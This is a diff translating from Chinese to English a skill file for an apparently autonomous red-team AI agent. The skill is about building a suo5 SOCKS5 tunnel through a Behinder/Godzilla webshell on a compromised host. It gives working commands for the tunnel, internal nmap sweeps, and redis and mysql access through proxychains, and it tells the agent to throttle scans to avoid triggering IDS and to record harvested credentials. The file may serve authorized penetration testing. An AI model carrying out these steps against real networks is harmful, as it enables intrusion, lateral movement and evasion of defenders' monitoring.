@@ -1,63 +1,63 @@
 ---
 name: suo5-tunnel
-description: 用 suo5 通过 WebShell/HTTP 建立 SOCKS5 隧道，把内网流量代理出来（内网突破核心工具）
-whenToUse: 已拿到一台机器（WebShell/RCE）需要进入内网扫描与横向时
+description: Use suo5 to establish a SOCKS5 tunnel through a webshell/HTTP, proxying intranet traffic out (core tool for intranet breakthrough)
+whenToUse: After obtaining access to a machine (webshell/RCE) and needing to enter the intranet for scanning and lateral movement
 role: internal
 enabled: true
 ---
 
-# suo5 内网隧道
+# suo5 intranet tunnel
 
-> **打进内网的标准通道只有这一条**：拿到 WebShell/RCE 后**必须**先用 suo5 建 socks5 隧道，
-> 把隧道登记进库（`redteam_tunnel_add` kind=suo5）并用 `redteam_session_check` 验证真的通，
-> 然后才谈内网测绘与横向。**没有隧道就不要手搓内网探测脚本**——手搓既慢又容易把入口打死。
-> 隧道入口的 WebShell 必须是冰蝎马/哥斯拉马（见技能 `webshell-toolkit`），否则用户无法复用。
+> **This is the standard channel for entering the intranet**: after obtaining a webshell/RCE, you **must** first establish a SOCKS5 tunnel with suo5,
+> register the tunnel in the database (`redteam_tunnel_add` kind=suo5) and verify it actually works with `redteam_session_check`,
+> then proceed to intranet mapping and lateral movement. **Do not handcraft intranet probing scripts without a tunnel**—it is slow and can easily kill the entry point.
+> The tunnel-entry webshell must be a Behinder/Godzilla webshell (see skill `webshell-toolkit`) so the user can reuse it.
 
-二进制：`$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）
+Binary: `$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64` (v2.2.0, static Go, no dependencies)
 
-## 建立隧道
+## Establish tunnel
 ```bash
 SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64
 
-# 1) 用 WebShell 作为隧道端点（HTTP 型）
+# 1) Use webshell as tunnel endpoint (HTTP type)
 $SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5
 
-# 2) 需要认证时
+# 2) With authentication
 $SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 --auth user:pass
 
-# 3) 只走 HTTP 代理（部分工具只支持 http proxy）
+# 3) HTTP proxy only (for tools that only support HTTP proxy)
 $SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:8081 -m http
 ```
-参数速查：`-t` 目标 shell URL、`-l` 本地监听、`-m socks5|http`、`--auth user:pass`、`-r` 重连间隔、`--debug` 看流量。
+Parameter quick reference: `-t` target shell URL, `-l` local listen, `-m socks5|http`, `--auth user:pass`, `-r` reconnect interval, `--debug` to inspect traffic.
 
-## 通过隧道做内网操作
+## Perform intranet operations through tunnel
 ```bash
-# curl 走 socks5
+# curl via SOCKS5
 curl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I
 
-# nmap 必须用 -sT（全连接）+ proxychains，或直接 --proxies（新版）
+# nmap must use -sT (full connect) + proxychains, or --proxies (newer versions)
 proxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt
 
-# 数据库 / 中间件
+# Databases / middleware
 proxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info
 proxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5
 
-# 浏览器/接口测试走隧道
+# Browser/API testing through tunnel
 curl -s --socks5 127.0.0.1:1080 "http://10.0.0.8:8080/api/user/1" -H "Cookie: JSESSIONID=..."
 ```
 
-## 内网扫描节奏（避免告警）
-- 先 `/24` 存活探测（`nmap -sn` 经隧道或 ICMP），再对存活主机做常见端口。
-- 速率降到 `-T2 --max-rate 50`，避免 IDS 触发。
-- 新发现的资产全部 `redteam_asset_add`（会自动按 /24 建 C 段），并标 `provenance="active"`、`tool="suo5+nmap"`。
+## Intranet scan pacing (avoid alerts)
+- First do `/24` liveness probing (`nmap -sn` through tunnel or ICMP), then scan common ports on live hosts.
+- Reduce rate to `-T2 --max-rate 50` to avoid triggering IDS.
+- Add every newly discovered asset with `redteam_asset_add` (auto-creates /24 segments), marking `provenance="active"`, `tool="suo5+nmap"`.
 
-## 落库
-- **建好立刻登记（强制）**：`redteam_tunnel_add`（`kind=suo5`、`listen=127.0.0.1:1080`、`entry=<WebShell URL>`、`reach=可达网段`、`command=完整启动命令`），`webshell_id` 指向对应的 WebShell 记录；随后 `redteam_session_check` 实测连通性，确认 status=active 再往下走。
-- 隧道本身写 `redteam_chain_add`（stage=pivot，detail 写隧道端点与本地端口）。
-- 每个内网资产、每次成功登录、每条凭据分别落库（asset/access/credential）。
-- 隧道掉了用 `redteam_tunnel_update` 标 down；不要留一个"看起来在跑其实不通"的隧道给后续角色踩空。
+## Record requirements
+- **Register immediately after setup (required)**: `redteam_tunnel_add` (`kind=suo5`, `listen=127.0.0.1:1080`, `entry=<webshell URL>`, `reach=reachable segments`, `command=full startup command`), set `webshell_id` to the corresponding webshell record; then verify connectivity with `redteam_session_check` and confirm status=active before proceeding.
+- Record the tunnel itself with `redteam_chain_add` (stage=pivot, detail includes tunnel endpoint and local port).
+- Record each intranet asset, each successful login, and each credential separately (asset/access/credential).
+- If tunnel drops, mark it down with `redteam_tunnel_update`; do not leave a tunnel that "looks running but is actually broken" for later roles to hit.
 
-## 注意事项
-- 隧道端点文件用完后按需清理，恢复目标原状。
-- 免费公网代理不适合承载隧道；suo5 走的是目标自身的 WebShell，不需要额外代理。
-- 只在授权范围内使用。
+## Notes
+- Clean up tunnel endpoint files as needed and restore target to original state.
+- Free public proxies are not suitable for carrying tunnels; suo5 uses the target's own webshell and does not require an extra proxy.
+- Use only within authorized scope.
